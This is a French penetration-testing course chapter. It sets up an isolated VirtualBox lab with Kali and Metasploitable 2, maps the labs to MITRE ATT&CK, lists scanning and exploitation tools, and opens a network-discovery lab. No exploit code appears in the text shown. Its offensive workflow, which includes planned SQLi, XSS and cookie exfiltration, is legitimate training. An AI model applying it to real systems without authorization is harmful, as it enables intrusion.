# Chapitre 1 — Introduction au cours, mise en place du laboratoire et exploitation complète

## 1. Objectif
Ce chapitre vous guide pas à pas à travers la découverte du framework MITRE ATT&CK, la présentation de l'architecture du laboratoire, la présentation des outils, puis la mise en place et la validation de l'environnement virtuel. Vous apprendrez à comprendre la topologie réseau, à cartographier les techniques fondamentales sur le framework MITRE ATT&CK, à rechercher les vulnérabilités connues hors ligne, à construire le plan d'attaque maître et à en réaliser la première phase d'exécution. Quatre labs d'approfondissement complètent le chapitre : l'énumération service par service de Metasploitable 2 (Lab-05), la validation des CVE avec matrice de risques (Lab-06), l'exploitation des quatre CVE critiques (Lab-07) et l'exploitation web DVWA avec SQLi, XSS et exfiltration (Lab-08).

> **Périmètre** — Ce chapitre ne s'applique **que** dans le périmètre `192.168.56.0/24` du laboratoire isolé. Ne jamais appliquer ces manipulations sur des systèmes réels sans autorisation administrative.

> **Format des labs** — chaque étape présente : (1) l'**exemple de commande** dans un bloc `bash`, (2) l'**explication de la commande** en prose ou en tableau, option par option, (3) le **résultat attendu** dans un bloc `text`, issu d'un test réel. L'explication est intégrée à l'étape : aucun corrigé séparé n'est nécessaire, et les commandes, preuves et CVE existantes sont conservées.

## 2. Prérequis

**Assurez-vous d'avoir :**
- Accès à VirtualBox ou VMware Workstation.
- Images ISO (images disque au format ISO 9660) : **Kali Linux** et **Metasploitable 2** sont obligatoires. Windows XP et Windows Server 2016 sont **optionnels** : ils ne sont pas utilisés dans ce chapitre et restent marqués `N/A` s'ils sont absents.
- Un réseau **host-only** `vboxnet0` en `192.168.56.0/24`, avec le DHCP VirtualBox désactivé. Le NAT (Network Address Translation) et l'accès Internet ne sont **pas requis** : toutes les recherches CVE de ce chapitre se font hors ligne avec la base locale Exploit-DB.
- Identifiants de laboratoire : `kali`/`kali` sur Kali, `msfadmin`/`msfadmin` sur Metasploitable 2, `win`/`win` pour Windows XP et compte administrateur local défini à l'installation pour Windows Server 2016.
- Sur Kali, les outils `nmap`, `searchsploit`, `msfconsole`, `nikto`, `whatweb`, `gobuster`, `enum4linux`, `smbclient`, `smbmap`, `nbtscan`, `showmount`, `rpcinfo`, `mysql`, `psql`, `vncviewer`, `xdpyinfo`, `curl`, `dig`, `nc`, `ftp`, `telnet`, `script` et `tcpdump`. Le chapitre vérifie leur présence avant usage.
- Le mot de passe `sudo` de l'utilisateur `kali`. Les scans SYN (`nmap -sS`) exigent **root** ; à défaut, le fallback non-root `nmap -sT` est documenté.
- Un disque dur suffisant pour les machines virtuelles (au moins 20 Go par VM (Virtual Machine)).
- Un terminal bash sur l'hôte et une session SSH vers Kali. Les preuves sont horodatées, capturent `stdout` + `stderr` et le code retour.

> **Convention de preuve** — chaque commande est exécutée avec la fonction `prouve` ci-dessous. Elle écrit l'horodatage, la commande, la sortie complète et le code retour dans un fichier de `preuves/`. Le motif `commande | tee fichier` seul est **interdit** : il perd `stderr` et le code retour.

```bash
prouve() {
  local fichier="$1"; shift
  mkdir -p "$(dirname "$fichier")"
  { printf '# date: %s\n# cmd: %s\n' "$(date -Is)" "$*"
    "$@"; printf '# rc=%d\n' "$?"
  } 2>&1 | tee "$fichier"
}
set -o pipefail
```

Contrôle : `grep '^# rc=' preuves/ch1-lab1/*.txt` doit afficher un code retour pour chaque preuve.

### 2.1 Implémentation de la fonction de preuve sur Kali

La fonction doit être **chargée dans le shell courant**. Trois méthodes sont possibles ; la méthode 1 est celle utilisée par les labs.

#### Méthode 1 — Fichier dédié chargé avec `source` (recommandée pour le lab)

1. Se connecter à Kali et créer le fichier :

```bash
ssh kali@192.168.56.101
cd /home/kali
nano /home/kali/prouve.sh
```

2. Coller la fonction ci-dessus, puis enregistrer (`Ctrl+O`, `Entrée`, `Ctrl+X`). Le fichier contient la fonction et `set -o pipefail`.

3. Charger la fonction dans le shell courant :

```bash
source /home/kali/prouve.sh
type prouve
```

`source` (ou `.`) lit le fichier dans le shell courant. **Ne lancez pas `./prouve.sh`** : le script s'exécuterait dans un shell enfant, la fonction disparaîtrait au retour et `prouve` serait introuvable. `chmod +x` n'est pas nécessaire pour `source` ; il ne devient utile que pour une exécution directe, qui n'est pas le mode prévu ici.

4. Vérifier avec une commande qui réussit puis une commande qui échoue :

```bash
cd /home/kali
prouve preuves/test/ok.txt echo bonjour
prouve preuves/test/echec.txt commande_inexistante
grep -H '^# rc=' preuves/test/*.txt
```

Résultat attendu : `# rc=0` pour `echo`, `# rc=127` pour la commande inexistante. Le fichier contient `# date:`, `# cmd:`, la sortie et `# rc=`.

#### Méthode 2 — Intégration permanente dans `~/.bashrc`

1. Ouvrir le fichier de configuration :

```bash
nano ~/.bashrc
```

2. Ajouter à la fin la fonction et `set -o pipefail`, puis enregistrer.

3. Recharger la configuration :

```bash
source ~/.bashrc
type prouve
```

La fonction est alors disponible dans tous les nouveaux terminaux. `set -o pipefail` s'applique à toutes les sessions interactives ; si vous ne voulez pas ce réglage global, utilisez la méthode 1.

#### Méthode 3 — Script global `/usr/local/bin/prouve`

Cette méthode crée une commande autonome, utilisable par tous les utilisateurs. Elle convient aux commandes externes (`nmap`, `searchsploit`, etc.), mais **pas** aux fonctions, alias ou commandes internes du shell appelant, car le script s'exécute dans un processus séparé.

1. Créer le script :

```bash
sudo nano /usr/local/bin/prouve
```

2. Coller le contenu suivant. Il ne contient **pas** `local` : un script n'est pas une fonction, et `local` hors fonction provoque `local: utilisable seulement dans une fonction`.

```bash
#!/usr/bin/env bash
set -o pipefail

fichier="$1"; shift
mkdir -p "$(dirname "$fichier")"
{ printf '# date: %s\n# cmd: %s\n' "$(date -Is)" "$*"
  "$@"; printf '# rc=%d\n' "$?"
} 2>&1 | tee "$fichier"
```

3. Rendre le script exécutable et tester avec le **chemin explicite** (pour ne pas appeler la fonction déjà chargée par la méthode 1) :

```bash
sudo chmod +x /usr/local/bin/prouve
/usr/local/bin/prouve preuves/test/script-ok.txt echo bonjour
grep '^# rc=' preuves/test/script-ok.txt
```

Résultat attendu : `# rc=0`.

**Sémantique du code retour.** `prouve` (fonction ou script) enregistre le code retour de la commande dans le fichier, mais renvoie `0` tant que `tee` réussit : le dernier `printf` du groupe réussit, donc `pipefail` ne propage pas l'échec de la commande. C'est volontaire pour qu'une commande qui échoue (par exemple `searchsploit -h` avec `rc=2`) n'interrompe pas la séquence du lab. Le fichier `# rc=` est la référence. Pour un script qui doit s'arrêter sur échec, utilisez la variante stricte suivante, qui capture le code avant de le retourner :

```bash
prouve_strict() {
  local fichier="$1"; shift
  local rc
  mkdir -p "$(dirname "$fichier")"
  {
    printf '# date: %s\n# cmd: %s\n' "$(date -Is)" "$*"
    "$@"; rc=$?
    printf '# rc=%d\n' "$rc"
    return "$rc"
  } 2>&1 | tee "$fichier"
}
set -o pipefail
```

Test : `prouve_strict preuves/test/echec-strict.txt commande_inexistante; echo "rc=$?"` doit afficher `rc=127`.

## 3. Présentation du framework MITRE ATT&CK

> **Convention de lecture** — Chaque acronyme est développé à sa première occurrence avec son nom complet en anglais entre parenthèses, puis repris dans le glossaire en fin de chapitre (section 15).

### 3.1 Qu'est-ce que MITRE ATT&CK ?

**MITRE (The MITRE Corporation)** est une organisation américaine à but non lucratif qui gère des centres de recherche et développement pour l'administration fédérale et le secteur privé. Le nom « MITRE » n'est pas un acronyme : c'est le nom de l'organisation.

**ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)** est une base de connaissances publique qui recense les comportements observés des adversaires, c'est-à-dire la manière dont les attaquants procèdent réellement. Elle a été créée par MITRE en 2013 à partir de l'analyse d'intrusions réelles, notamment celles menées par des groupes **APT (Advanced Persistent Threat)**, c'est-à-dire des groupes d'attaque persistants et sophistiqués.

ATT&CK n'est pas :
- un outil de scan ou un antivirus ;
- une base de vulnérabilités (ce rôle est dévolu aux **CVE (Common Vulnerabilities and Exposures)**) ;
- une liste ordonnée d'étapes à suivre mécaniquement ;
- un cadre de conformité réglementaire.

ATT&CK est une **base de connaissances structurée de TTP (Tactics, Techniques, and Procedures)**, c'est-à-dire un langage commun pour décrire, comparer et détecter les comportements adverses.

Le framework existe en trois domaines principaux :

| Domaine | Nom complet anglais | Périmètre | Exemple de technique |
|---|---|---|---|
| Enterprise | Enterprise ATT&CK | Windows, Linux, macOS, Cloud, Network, Containers | T1059 Command and Scripting Interpreter |
| Mobile | Mobile ATT&CK | Android, iOS | T1409 Access Stored Application Data |
| ICS | Industrial Control Systems ATT&CK | Systèmes industriels et automates | T0817 Drive-by Compromise |

![alt text](image.png)

*Figure 1 — Exemple de matrice MITRE ATT&CK : les colonnes représentent les tactiques et les lignes les techniques.*

### 3.2 Structure de la matrice ATT&CK

Une matrice ATT&CK se lit comme un tableau à deux dimensions :

- **les colonnes** sont les **tactiques** : le *pourquoi* de l'action ;
- **les lignes** sont les **techniques** : le *comment* général ;
- les **sous-techniques** apparaissent imbriquées sous leur technique parente ;
- chaque case peut être colorée, commentée ou scorée dans le **Navigator (MITRE ATT&CK Navigator)**, l'outil de visualisation officiel.
  

![alt text](image-2.png)

Une **couche (layer)** est un fichier JSON (JavaScript Object Notation) qui stocke les annotations, couleurs, commentaires et scores appliqués à une matrice. C'est ce fichier que le Lab 3 exporte comme plan maître.

Les identifiants ATT&CK suivent une convention stable :

| Élément | Préfixe | Exemple | Signification |
|---|---|---|---|
| Tactique | TA | TA0001 | Initial Access |
| Technique | T | T1190 | Exploit Public-Facing Application |
| Sous-technique | T + suffixe | T1059.001 | PowerShell |
| Groupe | G | G0001 | Groupe APT documenté |
| Logiciel | S | S0001 | Outil ou malware documenté |
| Mitigation | M | M1016 | Vulnerability Scanning |
| Source de données | DS | DS0017 | Command (les journaux de trafic réseau utilisent DS0029 Network Traffic) |
| Campagne | C | C0001 | Campagne d'attaque documentée |

ATT&CK est **versionné**. Ce support prend comme référence ATT&CK Enterprise v14 ; une couche Navigator doit référencer exactement la même version que la matrice utilisée, sinon certaines techniques peuvent être déplacées, renommées ou retirées.

### 3.3 Tactic, Technique, Sub-technique, Procedure : la hiérarchie

| Terme | Nom complet anglais | Question à laquelle il répond | Exemple |
|---|---|---|---|
| Tactic | Tactical Goal | Pourquoi l'attaquant agit-il ? | TA0001 Initial Access |
| Technique | Technique | Comment procède-t-il de façon générale ? | T1190 Exploit Public-Facing Application |
| Sub-technique | Sub-technique | Quelle variante précise utilise-t-il ? | T1059.001 PowerShell |
| Procedure | Procedure | Quelle implémentation précise a été observée ? | Un groupe APT précis utilise un exploit précis contre une version précise |
| TTP | Tactics, Techniques, and Procedures | Ensemble des tactiques, techniques et procédures | Le comportement complet d'un groupe APT |

Points importants :

- une **technique** peut appartenir à **plusieurs tactiques** : T1071 Application Layer Protocol relève principalement de Command and Control, tandis que T1040 Network Sniffing peut relever de Credential Access et de Discovery ;
- une **sous-technique** hérite du contexte de sa technique parente : T1059.001 PowerShell est une spécialisation de T1059 Command and Scripting Interpreter ;
- une **procédure** n'a pas d'identifiant ATT&CK propre : c'est l'observation concrète d'une technique par un groupe, un logiciel ou un outil ;
- **TTP (Tactics, Techniques, and Procedures)** désigne le triplet complet : la tactique (le but), la technique (la méthode) et la procédure (la mise en œuvre observée).

**Exemple appliqué au laboratoire** : dans le Chapitre 2, Lab 2, l'objectif est l'**Initial Access** (tactique) ; la méthode générale est **T1190 Exploit Public-Facing Application** (technique) ; la procédure est l'utilisation de `sqlmap` contre `http://192.168.56.103/login.php` avec une charge utile d'injection SQL (Structured Query Language) ; la faiblesse correspondante est classée **CWE (Common Weakness Enumeration) 89** ; la CVE (Common Vulnerabilities and Exposures) éventuelle dépend de la version exacte du composant web.

### 3.4 Les 14 tactiques Enterprise

| ID | Tactic (nom complet anglais) | Traduction française | Objectif | Exemple de technique |
|---|---|---|---|---|
| TA0043 | Reconnaissance | Reconnaissance | Collecter des informations avant l'attaque | T1595 Active Scanning |
| TA0042 | Resource Development | Développement de ressources | Préparer infrastructures, outils et capacités | T1588 Obtain Capabilities |
| TA0001 | Initial Access | Accès initial | Entrer dans le système ciblé | T1190 Exploit Public-Facing Application |
| TA0002 | Execution | Exécution | Exécuter du code malveillant | T1059 Command and Scripting Interpreter |
| TA0003 | Persistence | Persistance | Maintenir l'accès dans le temps | T1053 Scheduled Task/Job |
| TA0004 | Privilege Escalation | Élévation de privilèges | Obtenir des droits supérieurs | T1068 Exploitation for Privilege Escalation |
| TA0005 | Defense Evasion | Évasion des défenses | Éviter la détection | T1027 Obfuscated Files or Information |
| TA0006 | Credential Access | Accès aux identifiants | Voler mots de passe, hachages ou jetons | T1110 Brute Force |
| TA0007 | Discovery | Découverte | Cartographier l'environnement | T1046 Network Service Discovery |
| TA0008 | Lateral Movement | Déplacement latéral | Se déplacer vers d'autres systèmes | T1021 Remote Services |
| TA0009 | Collection | Collecte | Rassembler les données utiles | T1119 Automated Collection |
| TA0011 | Command and Control | Commande et contrôle | Piloter le système compromis | T1071 Application Layer Protocol |
| TA0010 | Exfiltration | Exfiltration | Sortir les données du réseau | T1041 Exfiltration Over C2 (Command and Control) Channel |
| TA0040 | Impact | Impact | Détruire, chiffrer ou perturber | T1499 Endpoint Denial of Service |

> Une attaque réelle ne suit pas toujours les tactiques dans cet ordre. ATT&CK est une grille de lecture, pas un scénario linéaire.
![alt text](image-1.png)  

### 3.5 CVE, CWE, CVSS, CAPEC : les bases des vulnérabilités

| Acronyme | Nom complet anglais | Rôle | Exemple | Lien avec ATT&CK |
|---|---|---|---|---|
| CVE | Common Vulnerabilities and Exposures | Identifiant unique et public d'une vulnérabilité | CVE-2021-44228 | Une CVE peut être exploitée via une ou plusieurs techniques ATT&CK |
| CWE | Common Weakness Enumeration | Classification du type de faiblesse | CWE-89 SQL Injection | Décrit la cause ; ATT&CK décrit l'action de l'attaquant |
| CVSS | Common Vulnerability Scoring System | Score de gravité de 0 à 10 | CVSS 9.8 pour CVE-2011-2523 | Aide à prioriser les remédiations |
| CAPEC | Common Attack Pattern Enumeration and Classification | Catalogue de motifs d'attaque | CAPEC-66 SQL Injection | Décrit le motif ; ATT&CK décrit le comportement adverse |
| NVD | National Vulnerability Database | Base enrichie des CVE et des scores CVSS | Fiche NVD de CVE-2007-2447 | Source de vérification et de contexte |
| KEV | Known Exploited Vulnerabilities | Catalogue des vulnérabilités réellement exploitées | Catalogue KEV de la CISA (Cybersecurity and Infrastructure Security Agency) | Aide à prioriser les CVE exploitées dans la nature |
| ATT&CK | Adversarial Tactics, Techniques, and Common Knowledge | Base de connaissances des comportements adverses | T1190 Exploit Public-Facing Application | Décrit le *comment*, pas la faille elle-même |

**Différence essentielle** : une CVE est une **faille** dans un produit ; une technique ATT&CK est une **méthode d'attaque**. Une même technique peut exploiter plusieurs CVE, et une même CVE peut être exploitée de plusieurs manières. Exemple : CVE-2017-0144 (EternalBlue) est une vulnérabilité SMB (Server Message Block) exploitée via T1210 Exploitation of Remote Services.

### 3.6 Utilisation concrète de MITRE ATT&CK

ATT&CK sert à plusieurs équipes et à plusieurs moments du cycle de sécurité :

- **CTI (Cyber Threat Intelligence)** : classer les groupes APT et leurs campagnes avec un vocabulaire commun.
- **Detection engineering** : concevoir des règles SIEM (Security Information and Event Management) et EDR (Endpoint Detection and Response) à partir des techniques et des sources de données.
- **Red team / pentest** : planifier les TTP à tester et mesurer la couverture réelle.
- **Purple team** : comparer les techniques offensives et les détections défensives dans une même matrice.
- **SOC (Security Operations Center)** : trier les alertes en les rattachant à une tactique et à une technique.
- **Analyse de risques et de gaps** : produire une heatmap de couverture et prioriser les mitigations.
- **Reporting** : parler le même langage que les autres équipes, sans dépendre d'un outil propriétaire.
- **Formation et laboratoires** : cartographier chaque étape d'un laboratoire, comme dans le plan maître du Lab 3.

**Limites** : ATT&CK est descriptif et non prescriptif ; il ne couvre pas toutes les actions possibles ; il ne remplace ni la gestion des vulnérabilités (CVE, CVSS), ni la conformité, ni une méthodologie de test complète. Il peut être mal utilisé s'il devient une simple checklist.

### 3.7 Comment lire une fiche technique

Une fiche technique ATT&CK contient généralement :

1. l'identifiant et le nom (ex. T1190 Exploit Public-Facing Application) ;
2. la ou les tactiques associées (ex. TA0001 Initial Access) ;
3. une description du comportement ;
4. des exemples de procédures observées chez des groupes (G) ou des logiciels (S) ;
5. les mitigations (M) ;
6. les sources de données et composants de détection (DS) ;
7. des références externes.

Exemple de lecture pour le laboratoire :

| Lab | Action | Tactic | Technique | Sous-technique | CVE / CWE |
|---|---|---|---|---|---|
| Ch1 Lab1 | `ip a`, `ping`, `nmap` | Discovery | T1016 System Network Configuration Discovery / T1046 Network Service Discovery | — | — |
| Ch1 Lab2 | `searchsploit` | Resource Development | T1588.006 Vulnerabilities | — | CVE-2011-2523, CVE-2007-2447, CVE-2010-2075 |
| Ch1 Lab5 | Énumération des services | Discovery | T1046 Network Service Discovery | — | — |
| Ch1 Lab6 | Validation CVE et risques | Resource Development | T1588.006 Vulnerabilities | — | CVE-2011-2523, CVE-2007-2447, CVE-2010-2075, CVE-2004-2687 |
| Ch2 Lab1 | SYN flood | Impact | T1498 Network Denial of Service / T1499 Endpoint Denial of Service | — | — |
| Ch2 Lab2 | SQL (Structured Query Language) injection | Initial Access / Execution | T1190 Exploit Public-Facing Application / T1203 Exploitation for Client Execution (théorique) | — | CWE-89, CVE selon la cible |
| Ch2 Lab3 | Pass-the-Hash | Defense Evasion / Lateral Movement | T1550 Use Alternate Authentication Material | T1550.002 Pass the Hash | — |
| Ch2 Lab3 | Brute-force | Credential Access | T1110 Brute Force | T1110.001 Password Guessing | — |
| Ch3 msfvenom | Génération de payload | Resource Development / Execution | T1587.001 Malware / T1204.002 Malicious File (théorique) | — | — |
| Ch3/Ch4 | Exfiltration | Exfiltration | T1041 Exfiltration Over C2 Channel (analyse) | — | — |
| Ch4 Lab4 | Restauration snapshot (remédiation) | — | — | — | — |
| Ch5 Lab1 | Audit des comptes | Discovery / Credential Access | T1087 Account Discovery / T1069 Permission Groups Discovery / T1110 Brute Force | T1110.001 Password Guessing | — |
| Ch5 Lab2 | Audit SSH | Lateral Movement / Defense Evasion | T1021 Remote Services / T1078 Valid Accounts | — | — |
| Ch5 Lab3 | Politique de mots de passe | Credential Access | T1110 Brute Force | T1110.001 Password Guessing | — |
| Ch5 Lab4 | Audit pare-feu | Discovery / Defense Evasion | T1046 Network Service Discovery / T1562.004 Disable or Modify System Firewall | — | — |
| Ch5 Lab5 | Matrice de risques | Initial Access / Execution / Lateral Movement / Privilege Escalation | T1190 / T1203 / T1210 / T1068 | — | CWE selon la cible |
| Ch5 Lab6 | Plan de remédiation 90 jours | Planification défensive | — | — | — |
| Ch5 Lab7 | Synthèse et validation | — | Tous les IDs | — | — |

> La restauration d'un snapshot est une action de remédiation, pas une technique adverse. T1490 Inhibit System Recovery décrit au contraire l'action d'un attaquant qui empêche la restauration. Le détail complet des techniques du chapitre 5 figure dans l'annexe A.5 et dans le séquencement du plan maître.

### 3.8 Application au laboratoire

Dans ce cours, ATT&CK n'est pas seulement un support théorique :

- chaque étape de lab est reliée à une tactique et à une technique ;
- les résultats sont consignés dans le journal d'exécution ;
- la couche Navigator du **Chapitre 1, Lab 3** sert de plan maître pour les chapitres 1 à 5 ;
- les identifiants legacy ou erronés sont conservés puis corrigés, afin de ne perdre aucune information ;
- le plan distingue clairement ce qui est **exécuté**, **planifié**, **théorique** ou **non applicable**.

### 3.9 Contexte d'utilisation de MITRE ATT&CK

MITRE ATT&CK s'utilise comme une **grille de lecture commune** entre l'offensive et la défensive. Dans ce cours, il sert à :

1. **Décrire** ce que fait chaque lab, sans ambiguïté, avec une tactique et une technique.
2. **Planifier** les attaques autorisées dans le laboratoire, via le plan maître du Lab 3.
3. **Détecter** les comportements exercés, en reliant chaque technique à une source de données et à une règle de détection.
4. **Mitiger** chaque technique par une contre-mesure documentée.
5. **Mesurer** la couverture du programme et identifier les gaps (Persistence, Reconnaissance, etc.).
6. **Comparer** les chapitres entre eux et éviter les doublons ou les oublis.
7. **Produire** un rapport lisible par un SOC, une équipe red team ou une direction sécurité.

Le plan maître du **Chapitre 1, Lab 3** matérialise cette utilisation : il contient l'inventaire des techniques, la couverture des 14 tactiques, le séquencement des 24 entrées de labs, le journal d'exécution et la couche Navigator exportée en JSON (JavaScript Object Notation).

## 4. Présentation de l'architecture du laboratoire

Le laboratoire repose sur un **ordinateur hôte** et un **réseau host-only** (réseau isolé du laboratoire). Le NAT (Network Address Translation) est **optionnel** : il n'est pas nécessaire pour ce chapitre, qui fonctionne en host-only pur. Quatre machines virtuelles (VM) sont prévues : une machine attaquante et trois cibles Windows/Linux. Seules Kali et Metasploitable 2 sont requises ici ; Windows Server 2016 et Windows XP restent `N/A` tant qu'ils ne sont pas déployés.

```mermaid
flowchart TB
    %% === ORDINATEUR HÔTE ===
    Hote["Ordinateur hôte"]:::host

    %% === RÉSEAUX ===
    NetHostOnly["Réseau host-only vboxnet0<br/>192.168.56.0/24"]:::net
    NetNAT["Réseau NAT<br/>optionnel — non requis"]:::net

    %% === MACHINES VIRTUELLES ===
    Kali["Kali Linux<br/>192.168.56.101 — attaquant"]:::kali
    Win2016["Windows Server 2016<br/>192.168.56.102 — cible Active Directory"]:::win2016
    Meta["Metasploitable 2<br/>192.168.56.103 — cible vulnérable"]:::meta
    WinXP["Windows XP<br/>192.168.56.104 — cible legacy"]:::winxp

    %% === CONNEXIONS ===
    Hote -->|host-only| NetHostOnly
    Hote -.->|NAT optionnel| NetNAT
    NetHostOnly --> Kali
    NetHostOnly --> Win2016
    NetHostOnly --> Meta
    NetHostOnly --> WinXP
    NetNAT -.-> Kali

    %% === STYLES ===
    classDef host fill:#e6f7ff,stroke:#1890ff,stroke-width:2px,color:#000
    classDef net fill:#e6f7ff,stroke:#1890ff,stroke-width:2px,color:#000
    classDef kali fill:#ffe0b2,stroke:#fb8c00,stroke-width:2px,color:#000
    classDef win2016 fill:#ffe0b2,stroke:#fb8c00,stroke-width:2px,color:#000
    classDef meta fill:#ffe0b2,stroke:#fb8c00,stroke-width:2px,color:#000
    classDef winxp fill:#ffe0b2,stroke:#fb8c00,stroke-width:2px,color:#000
```

**Fig 1.1** — Architecture du laboratoire en réseau host-only. Le NAT est optionnel et n'est pas requis pour ce chapitre.

> **Légende des couleurs** :
> - **Bleu clair** : Composants réseau et hôte.
> - **Orange** : Machines virtuelles du laboratoire.
> - **Flèches pleines** : Connexions host-only obligatoires.
> - **Flèche pointillée** : NAT optionnel, non requis pour ce chapitre (aucune route par défaut nécessaire).

| Composant | Rôle | Adresse / réseau |
|---|---|---|
| Ordinateur hôte | Exécute l'hyperviseur et les VM | `192.168.56.1` sur `vboxnet0` |
| Réseau host-only `vboxnet0` | Réseau isolé du laboratoire | `192.168.56.0/24` |
| Réseau NAT | Optionnel, non requis pour ce chapitre | — |
| Serveur DHCP VirtualBox | Adresse du service DHCP host-only, peut répondre même lorsque le DHCP est désactivé | `192.168.56.100` |
| Kali Linux | Machine attaquante | `192.168.56.101` |
| Windows Server 2016 | Cible Windows / Active Directory | `192.168.56.102` |
| Metasploitable 2 | Cible vulnérable | `192.168.56.103` |
| Windows XP | Cible legacy | `192.168.56.104` |

## 5. Présentation des outils

Les outils sont présentés ici **avant** leur mise en place. Ils seront utilisés dans l'ordre suivant : création des VM, configuration réseau, vérification depuis l'hôte et depuis Kali, puis exploitation dans Lab-07 et Lab-08.

| Outil | Type / nom complet | Rôle | Utilisé dans |
|---|---|---|---|
| VirtualBox | Oracle VM VirtualBox | Hyperviseur pour créer et exécuter les VM | Mise en place |
| VMware Workstation | VMware Workstation | Hyperviseur alternatif | Mise en place |
| Kali Linux | Distribution Linux orientée sécurité | Machine attaquante | Tous les labs |
| Windows Server 2016 | Microsoft Windows Server 2016 | Cible Windows / Active Directory (optionnelle) | Labs Active Directory |
| Metasploitable 2 | VM volontairement vulnérable | Cible principale | Tous les labs |
| Windows XP | Système d'exploitation legacy | Cible secondaire (optionnelle) | Labs Windows |
| Nmap | Network Mapper | Scanner de ports, de services et de scripts NSE | Labs 1, 4, 5, 6 |
| NSE | Nmap Scripting Engine | Moteur de scripts Nmap (catégories `safe`, `discovery`, `default`) | Labs 1, 5, 6 |
| OpenSSH | Open Secure Shell | Connexion distante sécurisée | Accès aux cibles |
| searchsploit | SearchSploit (Exploit-DB local) | Recherche locale d'exploits et de CVE | Labs 2, 5, 6, 7 |
| Metasploit Framework | msfconsole | Recherche passive de modules (Lab-02) et exploitation (Lab-07) | Labs 2, 7 |
| Nikto | Nikto Web Server Scanner | Analyse de serveur web | Lab 5 |
| WhatWeb | WhatWeb | Empreinte de technologies web | Lab 5 |
| Gobuster | Gobuster | Énumération de répertoires web | Lab 5 |
| enum4linux | enum4linux | Énumération SMB/NetBIOS | Lab 5 |
| smbclient / smbmap | Samba client / SMBMap | Énumération de partages SMB | Lab 5 |
| nbtscan | NBTscan | Énumération NetBIOS | Lab 5 |
| rpcinfo / showmount | rpcinfo / showmount | Énumération RPC et NFS | Lab 5 |
| mysql / psql | Clients MySQL / PostgreSQL | Vérification de version | Lab 5 |
| vncviewer / xdpyinfo | Clients VNC / X11 | Vérification de service | Lab 5 |
| curl / dig / nc | curl, dig, netcat | Requêtes HTTP/DNS, bannières et tests web | Labs 4, 5, 8 |
| sqlmap | sqlmap | Détection et exfiltration SQL automatisées | Lab 8 |
| Selenium / Chromium / chromedriver | Navigateur automatisé | Exécution réelle de JavaScript et exfiltration de cookie | Lab 8 |
| python3 | Python 3 | Script d'automatisation du test XSS navigateur | Lab 8 |
| script / tcpdump | util-linux / tcpdump | Journalisation de session et capture réseau | Lab 4 |
| MITRE ATT&CK Navigator | MITRE ATT&CK Navigator | Visualisation et planification ATT&CK | Lab 3 |

- **VirtualBox / VMware Workstation** : l'hyperviseur héberge les VM. Il doit être installé et fonctionnel avant toute création de machine.
- **Kali Linux** : distribution de test d'intrusion fournissant `nmap`, `ping`, `ip`, `ssh`, `searchsploit` et les outils d'énumération.
- **Windows Server 2016** : cible Windows utilisée pour les exercices Active Directory et les services Windows. Optionnelle dans ce chapitre.
- **Metasploitable 2** : machine virtuelle volontairement vulnérable, utilisée comme cible d'apprentissage.
- **Windows XP** : système legacy utilisé pour les exercices de compatibilité et de sécurité. Optionnel dans ce chapitre.
- **Nmap (Network Mapper)** : outil de découverte réseau qui identifie les ports ouverts, les services et leurs versions. Le moteur **NSE (Nmap Scripting Engine)** exécute des scripts de catégorie `safe`, `discovery` ou `default` ; les scripts `exploit` et `intrusive` sont exclus des labs de reconnaissance. L'exploitation de Lab-07 est réalisée avec Metasploit, pas avec NSE.
- **OpenSSH (Open Secure Shell)** : suite cliente et serveur pour les connexions distantes chiffrées.
- **searchsploit** : interface en ligne de commande de la base **Exploit-DB** copiée localement sur Kali. Elle fonctionne sans Internet.
- **Metasploit Framework** : cadre de test d'intrusion. Dans **Lab-02**, `msfconsole` est utilisé uniquement avec `search` (recherche passive). Dans **Lab-07**, il est utilisé avec `use`, `set`, `exploit` et `sessions`, sur la seule cible `192.168.56.103`, après snapshot et dans le périmètre du laboratoire.
- **Nikto / WhatWeb / Gobuster** : analyse web, empreinte technologique et énumération de répertoires.
- **enum4linux / smbclient / smbmap / nbtscan** : énumération SMB et NetBIOS. `smbmap` peut échouer sur les versions récentes de Python ; le chapitre fournit le fallback `smbclient -L` et le script NSE `smb-enum-shares`.
- **rpcinfo / showmount** : énumération des programmes RPC et des exports NFS.
- **mysql / psql** : clients de bases de données pour vérifier la version exposée.
- **vncviewer / xdpyinfo** : clients VNC et X11 pour vérifier l'accès distant.
- **curl / dig / nc** : requêtes HTTP, DNS, lecture de bannières et tests d'injection web contrôlés.
- **sqlmap** : automatisation de la détection SQLi, de l'énumération des bases et de l'extraction de tables. Utilisé avec `--batch` et `--answers=crack=N` pour ne pas casser les hashes dans le lab.
- **Selenium / Chromium / chromedriver** : navigateur réel piloté par Python pour prouver l'exécution JavaScript d'un XSS et la fuite de cookie vers un listener contrôlé.
- **python3** : exécution du script `xss-browser-test.py` et serveur HTTP de callback.
- **script / tcpdump** : journalisation de session terminal et capture réseau de référence.
- **MITRE ATT&CK Navigator** : outil de visualisation de la matrice ATT&CK et de création de couches JSON.

## Lab-01 — Découverte réseau et empreinte de la cible

### 6.1 Contexte et objectif

Vous disposez de Kali (`192.168.56.101`) et de Metasploitable 2 (`192.168.56.103`) sur le réseau host-only. L'objectif est de produire une **empreinte vérifiable** de la cible : interfaces, routes, hôtes actifs, ports TCP ouverts, versions de services, système d'exploitation et résultats des scripts NSE de catégorie `safe` et `discovery`.

**Place dans la chaîne** — première phase de reconnaissance (T1046). Aucune exploitation n'est exécutée ici ; les résultats alimentent Lab-02.

À la fin de ce lab, vous devez être capable de :
- distinguer une découverte d'hôtes d'un scan de ports ;
- choisir entre `-sS` (root) et `-sT` (non-root) ;
- expliquer pourquoi `-n` est obligatoire sur Kali dans cet environnement ;
- enregistrer chaque commande avec `stdout`, `stderr` et code retour ;
- interpréter un résultat NSE sans conclure au-delà de ce que le script affiche.

**Outils et commandes utilisées**

| Outil | Commandes | Rôle |
|---|---|---|
| `ip` | `ip -br a`, `ip route`, `ip neigh` | Identité réseau et voisinage de Kali |
| `ping` | `ping -c 3 -W 2 192.168.56.103` | Test de connectivité host-only |
| `nmap` | `nmap -sn -n`, `nmap -sS -n -p-`, `nmap -sV`, `nmap --script` | Découverte, ports, versions, NSE |
| `sudo` | `sudo -S -p '' nmap ...` | Exécution des scans SYN |
| `prouve` | `prouve fichier commande` | Journalisation `stdout`, `stderr`, `rc` |
| `sha256sum` | `sha256sum preuves/...` | Empreinte des preuves |

### 6.2 Plan MITRE ATT&CK

| Élément | Valeur |
|---|---|
| Tactique | Discovery (TA0007) |
| Technique | T1046 Network Service Discovery |
| Sous-technique | — |
| Source de données | Trafic réseau, journaux du pare-feu, journaux de services |
